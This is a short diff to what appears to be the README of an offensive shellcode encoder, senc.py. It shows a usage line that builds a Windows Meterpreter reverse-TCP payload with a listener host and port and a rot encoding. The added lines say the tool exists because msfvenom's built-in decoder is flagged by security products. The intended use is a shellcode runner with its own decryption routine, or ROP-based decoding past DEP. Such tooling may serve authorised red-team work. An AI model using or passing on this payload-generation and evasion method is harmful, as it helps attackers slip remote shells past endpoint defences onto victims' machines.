@@ -8,3 +8,8 @@ python senc.py -p windows/meterpreter/reverse_tcp -lhost eth0 -lport 443 -e rot 
 
 
 TODO - print cssharp decrypt function.
+
+That is mainly for:
+msfvenom builtin decoder on encoded shellcode is usually a red flag for any security solution.
+1 - using with a shellcode runner with decryption routine implemented.
+2 - DEP with ROP decode and etc..
